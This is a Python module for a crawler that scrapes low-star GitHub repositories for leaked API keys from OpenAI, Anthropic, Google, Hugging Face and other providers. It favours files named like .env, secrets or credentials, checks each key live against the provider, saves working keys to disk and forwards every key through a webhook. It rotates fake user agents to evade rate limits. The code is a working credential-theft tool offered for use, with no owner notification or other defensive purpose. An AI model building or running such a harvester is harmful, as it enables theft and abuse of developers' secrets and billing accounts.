"""
GitHub Full Crawler - Crawls all repositories and files to find API keys
"""
import time
import re
import random
import json
from typing import List, Dict, Set, Optional
from bs4 import BeautifulSoup
import requests
from fake_useragent import UserAgent
from config import API_KEY_PATTERNS
from key_validator import KeyValidator
import logging
from datetime import datetime
import os

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class GitHubCrawler:
    def __init__(self, repos_per_second: float = 100.0):
        """
        Initialize GitHub crawler
        
        Args:
            repos_per_second: Target repos per second (default: 100)
        """
        self.session = requests.Session()
        self.ua = UserAgent()
        self.validator = KeyValidator()
        # Set to 100 repos/sec as requested
        self.repos_per_second = min(repos_per_second, 100.0)
        self.delay_between_repos = max(0.01, 1.0 / self.repos_per_second)  # 0.01s delay for 100 repos/sec
        
        # Storage
        self.processed_repos: Set[str] = set()
        self.processed_files: Set[str] = set()
        self.found_keys: Set[str] = set()  # Track all found keys to avoid duplicates
        self.failed_repos: Set[str] = set()  # Track repos that failed (private/empty/404)
        
        # File handles for immediate saving
        # Create files if they don't exist, append if they do
        all_keys_exists = os.path.exists("found_api_keys.txt")
        working_keys_exists = os.path.exists("working_api_keys.txt")
        
        self.all_keys_file = open("found_api_keys.txt", "a", encoding="utf-8")
        self.working_keys_file = open("working_api_keys.txt", "a", encoding="utf-8")
        
        # Files will contain only keys, one per line (no headers)
        
        # Stats
        self.stats = {
            "repos_crawled": 0,
            "files_processed": 0,
            "keys_found": 0,
            "keys_tested": 0,
            "keys_working": 0,
            "start_time": time.time()
        }
        
        self._update_user_agent()
        logger.info(f"GitHub crawler initialized (target: {self.repos_per_second} repos/sec)")
    
    def _update_user_agent(self):
        """Update session with random user agent"""
        try:
            user_agent = self.ua.random
            self.session.headers.update({
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Referer': 'https://github.com/',
            })
        except Exception:
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Referer': 'https://github.com/',
            })
    
    def _make_request_with_retry(self, url: str, params: dict = None, max_retries: int = 3, base_delay: int = 30, timeout: int = 15) -> Optional[requests.Response]:
        """
        Make HTTP request with retry logic and exponential backoff
        
        Args:
            url: URL to request
            params: Query parameters
            max_retries: Maximum retry attempts
            base_delay: Base delay in seconds for rate limits
            timeout: Request timeout in seconds
            
        Returns:
            Response object or None if all retries failed
        """
        for attempt in range(max_retries):
            try:
                response = self.session.get(url, params=params, timeout=timeout)
                
                if response.status_code == 429:
                    # Rate limited - exponential backoff
                    delay = base_delay * (2 ** attempt)
                    logger.warning(f"Rate limited (attempt {attempt + 1}/{max_retries}). Waiting {delay} seconds...")
                    time.sleep(delay)
                    self._update_user_agent()  # Rotate user agent
                    continue
                
                if response.status_code == 200:
                    return response
                
                # For other status codes, log and retry
                if response.status_code >= 500:
                    logger.warning(f"Server error {response.status_code} (attempt {attempt + 1}/{max_retries})")
                    time.sleep(base_delay * (attempt + 1))
                    continue
                
                # For 4xx errors (except 429), don't retry
                return response
                
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, 
                    requests.exceptions.RequestException) as e:
                delay = base_delay * (2 ** attempt)
                logger.warning(f"Connection error (attempt {attempt + 1}/{max_retries}): {e}")
                logger.warning(f"Waiting {delay} seconds before retry...")
                time.sleep(delay)
                self._update_user_agent()  # Rotate user agent on error
                continue
            except Exception as e:
                logger.error(f"Unexpected error: {e}")
                return None
        
        logger.error(f"Failed to get response after {max_retries} attempts")
        return None
    
    def get_unpopular_repos(self, limit: int = 10000) -> List[str]:
        """
        Get list of unpopular repositories (0-5 stars) to crawl
        
        Args:
            limit: Maximum number of repos to get
            
        Returns:
            List of repo URLs (format: username/repo)
        """
        repos = []
        
        try:
            logger.info("Fetching unpopular repositories (0-5 stars)...")
            logger.info("Targeting repos with few or no stars for better key discovery...")
            
            # Start with a longer initial delay to avoid immediate rate limiting
            logger.info("Waiting 5 seconds before starting to avoid immediate rate limits...")
            time.sleep(5)
            
            # Strategy 1: Start with a smaller, focused search to get initial repos
            # Use only most common languages first
            languages = [
                'python', 'javascript', 'typescript', 'java'
            ]
            
            star_ranges = [
                'stars:0',           # 0 stars
                'stars:1..5',        # 1-5 stars (combined to reduce queries)
            ]
            
            for language in languages:
                if len(repos) >= limit:
                    break
                
                for star_range in star_ranges:
                    if len(repos) >= limit:
                        break
                    
                    try:
                        search_url = "https://github.com/search"
                        params = {
                            'q': f'language:{language} {star_range}',
                            'type': 'repositories',
                            's': 'updated',  # Sort by recently updated
                            'o': 'desc',
                            'p': 1
                        }
                        
                        logger.info(f"Searching: language:{language} {star_range}")
                        
                        # Try only first page initially to avoid rate limits
                        for page in range(1, 2):  # Only 1 page per query initially
                            if len(repos) >= limit:
                                break
                            
                            params['p'] = page
                            
                            # Add delay before request
                            time.sleep(5)  # Longer delay to avoid rate limits
                            
                            response = self._make_request_with_retry(search_url, params=params, max_retries=2, base_delay=20)
                            
                            if response is None or response.status_code != 200:
                                # If we got rate limited, skip this query and continue
                                if response and response.status_code == 429:
                                    logger.warning(f"Skipping {language} {star_range} due to rate limiting")
                                break
                            
                            soup = BeautifulSoup(response.content, 'lxml')
                            
                            # Find repository links - multiple strategies
                            repo_links = []
                            
                            # Strategy A: Find links in search results
                            links = soup.find_all('a', href=re.compile(r'^/[^/]+/[^/]+$'))
                            for link in links:
                                href = link.get('href', '').lstrip('/')
                                if href and '/' in href and not href.startswith('search'):
                                    repo_links.append(href)
                            
                            # Strategy B: Find by data attributes
                            data_links = soup.find_all('a', {'data-hydro-click': True})
                            for link in data_links:
                                href = link.get('href', '')
                                if href and href.startswith('/') and href.count('/') == 2:
                                    repo = href.lstrip('/')
                                    if '/' in repo and repo not in repo_links:
                                        repo_links.append(repo)
                            
                            # Strategy C: Find by class names
                            repo_divs = soup.find_all('div', class_=re.compile(r'repo|repository'))
                            for div in repo_divs:
                                link = div.find('a', href=re.compile(r'^/[^/]+/[^/]+$'))
                                if link:
                                    href = link.get('href', '').lstrip('/')
                                    if href and '/' in href and href not in repo_links:
                                        repo_links.append(href)
                            
                            # Add unique repos
                            for repo in repo_links:
                                if repo not in repos and len(repos) < limit:
                                    repos.append(repo)
                            
                            # Rotate user agent every page
                            self._update_user_agent()
                        
                        # Longer delay between language searches
                        time.sleep(5)
                        
                    except Exception as e:
                        logger.warning(f"Error fetching {language} repos with {star_range}: {e}")
                        continue
            
            # If we got some repos, start crawling immediately instead of waiting for more
            if len(repos) >= 10:  # If we have at least 10 repos, start crawling
                logger.info(f"Found {len(repos)} repositories to start with. Starting crawl immediately!")
                return repos
            
            # Fallback: If we couldn't get many repos, try simpler approach
            if len(repos) > 0:
                logger.info(f"Found {len(repos)} repositories. Starting crawl with these repos.")
                logger.info("Will try to discover more repos during crawling.")
                return repos
            
            # Last resort: Use a simple search that's less likely to rate limit
            logger.warning("Could not fetch repos from initial search. Trying simpler fallback...")
            
            try:
                # Try a very simple search with minimal parameters
                logger.info("Trying simple fallback search...")
                search_url = "https://github.com/search"
                params = {
                    'q': 'stars:0..5',
                    'type': 'repositories',
                    's': 'updated',
                    'o': 'desc',
                    'p': 1
                }
                
                # Only try first page
                response = self._make_request_with_retry(search_url, params=params, max_retries=1, base_delay=20)
                
                if response and response.status_code == 200:
                    soup = BeautifulSoup(response.content, 'lxml')
                    links = soup.find_all('a', href=re.compile(r'^/[^/]+/[^/]+$'))
                    
                    for link in links[:50]:  # Get first 50
                        href = link.get('href', '').lstrip('/')
                        if href and '/' in href and href not in repos:
                            repos.append(href)
                    
                    logger.info(f"Found {len(repos)} repos from fallback search")
            except Exception as e:
                logger.warning(f"Error with fallback search: {e}")
            
            # If we still have repos, return them
            if len(repos) > 0:
                logger.info(f"Starting with {len(repos)} repositories found via fallback")
                return repos
            
            # Final fallback: Return empty list but log helpful message
            logger.error("=" * 60)
            logger.error("Could not fetch any repositories due to rate limiting.")
            logger.error("=" * 60)
            logger.info("SOLUTIONS:")
            logger.info("1. Wait 5-10 minutes and try again (rate limits reset)")
            logger.info("2. Use a VPN or different network")
            logger.info("3. Reduce REPOS_PER_SECOND in .env file")
            logger.info("4. The program will continue trying in the background")
            logger.info("=" * 60)
            
            return repos  # Return empty list, but don't crash
            
        except Exception as e:
            logger.error(f"Error getting unpopular repos: {e}")
        
        return repos[:limit]
    
    def get_repo_files(self, repo: str, max_files: int = 2000) -> List[Dict]:
        """
        Get all code files from a repository (recursively)
        Optimized: Only try main branch first, if it works, use it. Otherwise try others.
        
        Args:
            repo: Repository name (format: username/repo)
            max_files: Maximum files to fetch
            
        Returns:
            List of file information dicts
        """
        files = []
        
        if repo in self.processed_repos or repo in self.failed_repos:
            return files
        
        try:
            # Try main branch first (most common) - if it works, use it
            branches = ['main', 'master']  # Reduced from 4 to 2 branches for speed
            
            for branch in branches:
                if len(files) >= max_files:
                    break
                
                try:
                    # Quick check if branch exists
                    branch_url = f"https://github.com/{repo}/tree/{branch}"
                    check_response = self.session.head(branch_url, timeout=2, allow_redirects=False)
                    if check_response.status_code != 200:
                        continue  # Branch doesn't exist, skip
                    
                    # Get files from this branch recursively
                    branch_files = self._get_files_from_branch(repo, branch, max_files - len(files))
                    if branch_files:  # If we found files, use this branch and stop
                        for f in branch_files:
                            if f["url"] not in [existing["url"] for existing in files]:
                                files.append(f)
                        # If we got files from main, don't try other branches (saves time)
                        if branch == 'main' and files:
                            break
                except Exception as e:
                    logger.debug(f"Error getting files from {branch}: {e}")
                    continue
            
        except Exception as e:
            logger.debug(f"Error getting files for {repo}: {e}")
        
        return files
    
    def _get_files_from_branch(self, repo: str, branch: str, max_files: int) -> List[Dict]:
        """Recursively get all files from a branch"""
        files = []
        visited_dirs = set()
        to_visit = [f"{repo}/tree/{branch}"]
        
        try:
            while to_visit and len(files) < max_files:
                current_path = to_visit.pop(0)
                
                if current_path in visited_dirs:
                    continue
                
                visited_dirs.add(current_path)
                
                # Construct URL
                if current_path.startswith(repo):
                    url_path = current_path.replace(f"{repo}/tree/", "")
                    url = f"https://github.com/{repo}/tree/{url_path}" if url_path != branch else f"https://github.com/{repo}/tree/{branch}"
                else:
                    url = f"https://github.com/{current_path}"
                
                try:
                    # Use faster timeout and fewer retries for speed
                    response = self._make_request_with_retry(url, max_retries=1, base_delay=3, timeout=3)
                    if response is None or response.status_code != 200:
                        continue
                    
                    soup = BeautifulSoup(response.content, 'lxml')
                    
                    # Find all links
                    links = soup.find_all('a', href=True)
                    
                    for link in links:
                        if len(files) >= max_files:
                            break
                        
                        href = link.get('href', '')
                        
                        # Check if it's a file (blob)
                        if '/blob/' in href and href.startswith(f'/{repo}/'):
                            full_url = f"https://github.com{href}"
                            
                            # Prioritize code files - focus on code files especially
                            file_ext = href.split('.')[-1].lower() if '.' in href else ''
                            
                            # Code file extensions (primary focus)
                            code_extensions = ['py', 'js', 'ts', 'jsx', 'tsx', 'java', 'go', 'rs', 'cpp', 'c', 'h', 
                                             'hpp', 'cc', 'cxx', 'php', 'rb', 'swift', 'kt', 'scala', 'clj', 'cljs',
                                             'cs', 'vb', 'fs', 'dart', 'elm', 'ex', 'exs', 'erl', 'hrl', 'hs', 'lhs',
                                             'ml', 'mli', 'pl', 'pm', 'r', 'R', 'm', 'mm', 'sh', 'bash', 'zsh', 'fish']
                            
                            # Config and data files (secondary)
                            config_extensions = ['yaml', 'yml', 'json', 'xml', 'toml', 'ini', 'conf', 'properties',
                                               'env', 'config', 'tf', 'tfvars', 'dockerfile', 'makefile', 'cmake',
                                               'gradle', 'maven', 'pom', 'sbt', 'build', 'package', 'requirements']
                            
                            # Text files (tertiary)
                            text_extensions = ['md', 'txt', 'log', 'readme', 'license', 'changelog', 'notes']
                            
                            # Check for common config/secret file names
                            file_name = href.split('/')[-1].lower()
                            is_secret_file = any(name in file_name for name in [
                                '.env', '.env.local', '.env.production', '.env.development',
                                'config', 'config.json', 'config.yaml', 'config.yml',
                                'secret', 'secrets', 'credentials', 'credential',
                                'key', 'keys', 'api_key', 'apikey', 'token', 'tokens',
                                'auth', 'authentication', 'password', 'passwords',
                                'settings', 'setting', 'conf', 'configuration'
                            ])
                            
                            # Process if it's a code file, config file, or secret-related file
                            is_code_file = file_ext in code_extensions
                            is_config_file = file_ext in config_extensions or is_secret_file
                            is_text_file = file_ext in text_extensions
                            
                            if is_code_file or is_config_file or (is_text_file and is_secret_file) or not file_ext:
                                if full_url not in self.processed_files:
                                    parts = href.split('/blob/')
                                    if len(parts) == 2:
                                        file_path = parts[1]
                                        files.append({
                                            "url": full_url,
                                            "path": file_path,
                                            "repo": repo
                                        })
                        
                        # Check if it's a directory (tree) to explore
                        elif '/tree/' in href and href.startswith(f'/{repo}/') and '/blob/' not in href:
                            if href not in visited_dirs:
                                to_visit.append(href.lstrip('/'))
                    
                    # Minimal delay - only every 10 directories for speed
                    if len(visited_dirs) % 10 == 0:
                        time.sleep(0.01)
                    
                except Exception as e:
                    logger.debug(f"Error processing {url}: {e}")
                    continue
                    
        except Exception as e:
            logger.debug(f"Error in _get_files_from_branch: {e}")
        
        return files
    
    def _check_branch_exists(self, repo: str, branch: str) -> bool:
        """Check if a branch exists"""
        try:
            url = f"https://github.com/{repo}/tree/{branch}"
            response = self.session.head(url, timeout=5, allow_redirects=False)
            return response.status_code == 200
        except:
            return False
    
    def get_raw_file_content(self, github_url: str) -> Optional[str]:
        """
        Get raw file content from GitHub URL with retry logic.
        Skips files over 1 MB or 1 GB to avoid memory issues.
        """
        if github_url in self.processed_files:
            return None
        
        self.processed_files.add(github_url)
        
        try:
            # Convert to raw URL
            if '/blob/' in github_url:
                raw_url = github_url.replace('github.com/', 'raw.githubusercontent.com/').replace('/blob/', '/')
            else:
                raw_url = github_url.replace('github.com/', 'raw.githubusercontent.com/')
            
            # Use retry logic for file fetching
            response = self._make_request_with_retry(raw_url, max_retries=2, base_delay=10)
            
            if response and response.status_code == 200:
                # Check file size from Content-Length header before processing
                content_length = response.headers.get('Content-Length')
                if content_length:
                    file_size = int(content_length)
                    # Skip files over 1 MB (1,048,576 bytes)
                    if file_size > 1024 * 1024:
                        return None
                    # Skip files over 1 GB (1,073,741,824 bytes)
                    if file_size > 1024 * 1024 * 1024:
                        return None
                
                # Check if it's a text file (not binary)
                content_type = response.headers.get('Content-Type', '')
                if 'text' in content_type or 'json' in content_type or 'javascript' in content_type:
                    content = response.text
                    # Double-check content size after download (in case Content-Length was missing)
                    if len(content) > 1024 * 1024:  # > 1 MB
                        return None
                    if len(content) > 1024 * 1024 * 1024:  # > 1 GB
                        return None
                    return content
            
        except Exception as e:
            logger.debug(f"Error fetching {github_url}: {e}")
        
        return None
    
    def extract_api_keys(self, content: str) -> List[Dict]:
        """
        Extract API keys from content
        
        Returns:
            List of dicts with key_type and key
        """
        found = []
        
        for key_type, patterns in API_KEY_PATTERNS.items():
            for pattern in patterns:
                matches = pattern.finditer(content)
                for match in matches:
                    # Extract key: use capture group if present, otherwise use full match
                    if match.groups():
                        key = match.group(1)  # Use captured group
                    else:
                        key = match.group(0)  # Use full match
                    
                    if key:
                        # Clean up key: remove quotes if present
                        key_clean = key.strip('"\'').strip()
                        
                        # Additional validation: skip if it looks like a hash (sha512, sha256, etc.)
                        if key_clean.lower().startswith(('sha', 'md5', 'base64')):
                            continue
                        
                        # Skip Pinecone keys that are just UUIDs without context
                        if key_type == 'pinecone':
                            if not match.groups():
                                continue  # Skip standalone UUIDs
                        
                        # Skip Cohere keys that don't have context
                        if key_type == 'cohere':
                            if not match.groups():
                                continue  # Skip standalone 40-char strings
                        
                        # Validate key length and format based on type
                        valid_length = False
                        
                        if key_type == 'openai_standard' and len(key_clean) == 51 and key_clean.startswith('sk-'):
                            valid_length = True
                        elif key_type == 'openai_project' and key_clean.startswith('sk-proj-') and len(key_clean) >= 57:
                            valid_length = True
                        elif key_type == 'anthropic' and (key_clean.startswith('sk-ant-') or key_clean.startswith('sk-ant-api03-')):
                            valid_length = True
                        elif key_type == 'google_gemini' and key_clean.startswith('AIza') and len(key_clean) == 39:
                            valid_length = True
                        elif key_type == 'huggingface' and key_clean.startswith('hf_') and len(key_clean) == 37:
                            valid_length = True
                        elif key_type == 'cohere' and len(key_clean) == 40:
                            valid_length = True
                        elif key_type == 'pinecone' and ((len(key_clean) == 36 and '-' in key_clean) or key_clean.startswith('pc-')):
                            valid_length = True
                        elif key_type == 'perplexity' and key_clean.startswith('pplx-'):
                            valid_length = True
                        elif key_type == 'mistral' and len(key_clean) >= 32:
                            valid_length = True
                        elif key_type == 'groq' and key_clean.startswith('gsk_'):
                            valid_length = True
                        
                        if valid_length:
                            # Check if we've seen this key before
                            if key_clean not in self.found_keys:
                                self.found_keys.add(key_clean)
                                found.append({
                                    "key_type": key_type,
                                    "key": key_clean,
                                    "timestamp": datetime.now().isoformat()
                                })
        
        return found
    
    def test_and_save_key(self, key_info: Dict):
        """
        Test a key and save it appropriately
        
        Args:
            key_info: Dict with key_type and key
        """
        key_type = key_info["key_type"]
        key = key_info["key"]
        
        # Get company name
        try:
            from webhook_notifier import get_company_name
            company_name = get_company_name(key_type)
        except:
            company_name = key_type.replace("_", " ").title()
        
        # Save to all keys file immediately with company name: COMPANY | KEY
        self.all_keys_file.write(f"{company_name} | {key}\n")
        self.all_keys_file.flush()  # Ensure it's written immediately
        
        # Track key in current run if app is available
        try:
            import key_tracker
            key_tracker.track_key(key)
        except:
            pass  # Silently fail if tracking not available
        
        self.stats["keys_found"] += 1
        logger.info(f"🔑 Found {key_type} key: {key[:30]}...")
        
        # Send webhook notification immediately when key is found
        try:
            from webhook_notifier import send_webhook_notification
            send_webhook_notification(key, key_type, "API key found", is_working=False)
        except Exception as e:
            logger.warning(f"Failed to send webhook notification for found key: {e}")
        
        # Test the key
        try:
            is_valid, message = self.validator.validate_key(key_type, key)
            self.stats["keys_tested"] += 1
            
            if is_valid:
                # Get company name (already retrieved above, but ensure it's available)
                try:
                    from webhook_notifier import get_company_name
                    company_name = get_company_name(key_type)
                except:
                    company_name = key_type.replace("_", " ").title()
                
                # Save to working keys file with company name: COMPANY | KEY
                self.working_keys_file.write(f"{company_name} | {key}\n")
                self.working_keys_file.flush()
                
                # Track working key too
                try:
                    import key_tracker
                    key_tracker.track_key(key)
                except:
                    pass
                
                self.stats["keys_working"] += 1
                logger.info(f"✅ WORKING {key_type} key: {key[:30]}... ({message})")
                
                # Send webhook notification for working key
                try:
                    from webhook_notifier import send_webhook_notification
                    send_webhook_notification(key, key_type, message, is_working=True)
                except Exception as e:
                    logger.warning(f"Failed to send webhook notification for working key: {e}")
            else:
                logger.debug(f"❌ Invalid {key_type} key: {message}")
        
        except Exception as e:
            logger.warning(f"Error testing key: {e}")
    
    def _quick_check_repo_exists(self, repo_path: str) -> bool:
        """Quick check if repo exists and is accessible (public)"""
        try:
            repo_url = f"https://github.com/{repo_path}"
            # Use HEAD request for speed - just check if it exists
            response = self.session.head(repo_url, timeout=2, allow_redirects=False)
            # 200 = exists and accessible, 301/302 = redirect (might be private), 404 = doesn't exist
            return response.status_code == 200
        except:
            return False
    
    def crawl_repo(self, repo: str):
        """Crawl a single repository with detailed timing"""
        if repo in self.processed_repos or repo in self.failed_repos:
            return
        
        # Validate repo format - should be username/repo or full URL
        if repo.startswith('https://github.com/'):
            repo_path = repo.replace('https://github.com/', '').strip('/')
        else:
            repo_path = repo.strip('/')
        
        # Check if it's a valid repo format (username/repo)
        parts = repo_path.split('/')
        if len(parts) != 2:
            # Invalid format, skip
            self.failed_repos.add(repo)
            return
        
        # Check for invalid patterns
        invalid_patterns = ['trending', 'sponsors', 'explore', 'topics', 'marketplace', 
                           'settings', 'notifications', 'dashboard', 'pulls', 'issues']
        if any(pattern in repo_path.lower() for pattern in invalid_patterns):
            # Invalid repo, skip
            self.failed_repos.add(repo)
            return
        
        repo_start_time = time.time()
        
        # Quick check if repo exists before trying to crawl
        check_start = time.time()
        if not self._quick_check_repo_exists(repo_path):
            # Repo doesn't exist or is private, skip immediately
            self.failed_repos.add(repo)
            check_time = time.time() - check_start
            # Don't log failed repos to reduce noise
            return
        
        self.processed_repos.add(repo)
        self.stats["repos_crawled"] += 1
        
        # Use the repo_path for crawling
        repo_url = f"https://github.com/{repo_path}"
        
        try:
            # Get all files in repo (reduced max_files for speed)
            files_start = time.time()
            files = self.get_repo_files(repo_path, max_files=200)  # Use repo_path instead of repo
            files_time = time.time() - files_start
            
            if not files:
                # Repo exists but has no files (empty or private files)
                self.failed_repos.add(repo)
                # Don't log empty repos to reduce noise - they're common
                return
            
            # Only log repos that have files (these are the ones we care about)
            logger.info(f"📁 {repo_url} - scrapped")
            
            # Process each file - optimized for speed
            file_processing_times = []
            content_fetch_times = []
            key_extraction_times = []
            key_test_times = []
            
            for i, file_info in enumerate(files, 1):
                try:
                    # Get file content
                    content_start = time.time()
                    content = self.get_raw_file_content(file_info["url"])
                    content_time = time.time() - content_start
                    content_fetch_times.append(content_time)
                    
                    if content:
                        self.stats["files_processed"] += 1
                        
                        # Extract API keys
                        extract_start = time.time()
                        found_keys = self.extract_api_keys(content)
                        extract_time = time.time() - extract_start
                        key_extraction_times.append(extract_time)
                        
                        # Test and save each key immediately
                        for key_info in found_keys:
                            test_start = time.time()
                            self.test_and_save_key(key_info)
                            test_time = time.time() - test_start
                            key_test_times.append(test_time)
                    
                    file_processing_times.append(time.time() - content_start)
                    
                    # No delays - process as fast as possible
                    # Only minimal delay every 100 files to avoid overwhelming
                    if i % 100 == 0:
                        time.sleep(0.001)  # Minimal delay
                    
                except Exception as e:
                    # Skip error logging for speed - only log critical errors
                    continue
            
            repo_time = time.time() - repo_start_time
            avg_file_time = sum(file_processing_times) / len(file_processing_times) if file_processing_times else 0
            avg_content_time = sum(content_fetch_times) / len(content_fetch_times) if content_fetch_times else 0
            avg_extract_time = sum(key_extraction_times) / len(key_extraction_times) if key_extraction_times else 0
            avg_test_time = sum(key_test_times) / len(key_test_times) if key_test_times else 0
            
            logger.info(f"  ⏱️  Repo time: {repo_time:.3f}s | Files: {len(files)} | Files fetch: {files_time:.3f}s | Avg file: {avg_file_time:.3f}s | Content: {avg_content_time:.3f}s | Extract: {avg_extract_time:.3f}s | Test: {avg_test_time:.3f}s")
            
        except Exception as e:
            # Only log critical errors
            if "rate limit" in str(e).lower() or "429" in str(e):
                logger.warning(f"Rate limited on {repo_url}")
            # Skip other errors to maintain speed
    
    def load_repos_from_file(self, filename: str = "firehose_repos.txt") -> List[str]:
        """
        Load repository URLs from file (from scrapper.py)
        
        Args:
            filename: Name of the file containing repo URLs
            
        Returns:
            List of repo names (format: username/repo)
        """
        repos = []
        if not os.path.exists(filename):
            return repos
        
        try:
            with open(filename, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line and line.startswith("https://github.com/"):
                        # Extract repo name from URL
                        repo_name = line.replace("https://github.com/", "").strip()
                        if repo_name and "/" in repo_name:
                            repos.append(repo_name)
                    elif line and "/" in line and not line.startswith("http"):
                        # Already in username/repo format
                        repos.append(line.strip())
            
            # Remove duplicates while preserving order
            seen = set()
            unique_repos = []
            for repo in repos:
                if repo not in seen:
                    seen.add(repo)
                    unique_repos.append(repo)
            
            return unique_repos
        except Exception as e:
            logger.error(f"Error loading repos from file: {e}")
            return []
    
    def crawl_all_continuous(self, repo_file: str = "firehose_repos.txt"):
        """
        Continuously crawl repositories from file, reloading as new repos are added
        
        Args:
            repo_file: File containing repository URLs (from scrapper.py)
        """
        logger.info("🚀 Starting continuous GitHub crawl...")
        logger.info(f"Target speed: {self.repos_per_second} repos/second")
        logger.info("📂 Loading repositories from scrapper...")
        logger.info("🔄 Running continuously until Ctrl+C...")
        
        last_file_position = 0  # Track file position instead of reloading
        processed_repos_from_file = set()
        repo_queue = []  # Queue of repos to process
        
        try:
            while True:
                # Check if file exists
                if os.path.exists(repo_file):
                    # Read only new lines from file (incremental reading)
                    try:
                        with open(repo_file, "r", encoding="utf-8") as f:
                            f.seek(last_file_position)
                            new_lines = f.readlines()
                            last_file_position = f.tell()
                            
                            # Parse new repos
                            for line in new_lines:
                                line = line.strip()
                                if line:
                                    if line.startswith("https://github.com/"):
                                        repo_name = line.replace("https://github.com/", "").strip()
                                    else:
                                        repo_name = line.strip()
                                    
                                    if repo_name and "/" in repo_name and repo_name not in processed_repos_from_file:
                                        processed_repos_from_file.add(repo_name)
                                        repo_queue.append(repo_name)
                        
                        # Process repos from queue at 100 repos/sec
                        while repo_queue:
                            repo = repo_queue.pop(0)
                            
                            try:
                                start_time = time.time()
                                
                                # Skip if already crawled
                                if repo in self.processed_repos:
                                    continue
                                
                                # Crawl the repo
                                self.crawl_repo(repo)
                                
                                # Calculate delay to maintain target speed (100 repos/sec = 0.01s per repo)
                                elapsed = time.time() - start_time
                                target_delay = self.delay_between_repos
                                if elapsed < target_delay:
                                    time.sleep(target_delay - elapsed)
                                
                                # Progress update every 10 repos
                                if self.stats["repos_crawled"] % 10 == 0:
                                    elapsed_total = time.time() - self.stats["start_time"]
                                    rate = self.stats["repos_crawled"] / elapsed_total if elapsed_total > 0 else 0
                                    logger.info(f"📈 Progress: {self.stats['repos_crawled']} repos crawled | "
                                              f"Rate: {rate:.2f} repos/sec | "
                                              f"Keys found: {self.stats['keys_found']} | "
                                              f"Working keys: {self.stats['keys_working']} | "
                                              f"Queue: {len(repo_queue)}")
                                
                                # Rotate user agent occasionally
                                if self.stats["repos_crawled"] % 20 == 0:
                                    self._update_user_agent()
                            
                            except Exception as e:
                                logger.error(f"Error crawling repo {repo}: {e}")
                                continue
                    
                    except Exception as e:
                        logger.debug(f"Error reading file: {e}")
                
                # Check file more frequently (no sleep if queue has items, minimal sleep if empty)
                if not repo_queue:
                    time.sleep(0.1)  # Check every 100ms instead of 1 second
                # If queue has items, continue processing immediately
        
        except KeyboardInterrupt:
            logger.info("\n" + "=" * 60)
            logger.info("🛑 Crawling interrupted by user (Ctrl+C)")
            logger.info("=" * 60)
            self.print_stats()
        except Exception as e:
            logger.error(f"Error in continuous crawl: {e}")
            self.print_stats()
        finally:
            # Close file handles
            self.all_keys_file.close()
            self.working_keys_file.close()
    
    def crawl_all(self, max_repos: int = 10000):
        """
        Main crawling function - crawls all repositories
        
        Args:
            max_repos: Maximum number of repos to crawl
        """
        logger.info("🚀 Starting full GitHub crawl...")
        logger.info(f"Target speed: {self.repos_per_second} repos/second")
        logger.info("🎯 Targeting unpopular repos (0-5 stars) for better key discovery")
        
        # Get list of unpopular repos to crawl
        repos = self.get_unpopular_repos(limit=max_repos)
        
        if not repos:
            logger.error("=" * 60)
            logger.error("No repositories found to crawl.")
            logger.error("This is likely due to GitHub rate limiting.")
            logger.error("=" * 60)
            logger.info("Please wait 5-10 minutes and try again.")
            logger.info("Rate limits typically reset after a short wait.")
            return
        
        if len(repos) < 10:
            logger.warning(f"Only found {len(repos)} repositories. This may be due to rate limiting.")
            logger.info("Starting crawl anyway. The program will work with what it has.")
        
        logger.info(f"Starting to crawl {len(repos)} repositories...")
        
        # Crawl each repo
        for i, repo in enumerate(repos, 1):
            try:
                start_time = time.time()
                repo_url = f"https://github.com/{repo}"
                
                # Crawl the repo
                self.crawl_repo(repo)
                
                # Calculate delay to maintain target speed (100 repos/sec = 0.01s per repo)
                elapsed = time.time() - start_time
                target_delay = self.delay_between_repos
                if elapsed < target_delay:
                    time.sleep(target_delay - elapsed)
                # If elapsed > target_delay, we're already behind, so no delay needed
                
                # Progress update
                if i % 10 == 0:
                    elapsed_total = time.time() - self.stats["start_time"]
                    rate = i / elapsed_total if elapsed_total > 0 else 0
                    logger.info(f"📈 Overall Progress: {i}/{len(repos)} repos crawled | "
                              f"Rate: {rate:.2f} repos/sec | "
                              f"Keys found: {self.stats['keys_found']} | "
                              f"Working keys: {self.stats['keys_working']}")
                    logger.info(f"   Last crawled: {repo_url}")
                
                # Rotate user agent occasionally
                if i % 20 == 0:
                    self._update_user_agent()
                
            except KeyboardInterrupt:
                logger.info("Crawling interrupted by user")
                break
            except Exception as e:
                logger.error(f"Error in crawl loop: {e}")
                continue
        
        # Print final stats
        self.print_stats()
        
        # Close file handles
        self.all_keys_file.close()
        self.working_keys_file.close()
    
    def print_stats(self):
        """Print crawling statistics"""
        elapsed = time.time() - self.stats["start_time"]
        
        logger.info(f"\n{'='*60}")
        logger.info(f"  CRAWLING STATISTICS")
        logger.info(f"{'='*60}")
        logger.info(f"Repos crawled: {self.stats['repos_crawled']}")
        logger.info(f"Files processed: {self.stats['files_processed']}")
        logger.info(f"Keys found: {self.stats['keys_found']}")
        logger.info(f"Keys tested: {self.stats['keys_tested']}")
        logger.info(f"Working keys: {self.stats['keys_working']}")
        logger.info(f"Time elapsed: {elapsed:.2f} seconds")
        logger.info(f"Average rate: {self.stats['repos_crawled']/elapsed:.2f} repos/sec" if elapsed > 0 else "")
        logger.info(f"{'='*60}\n")

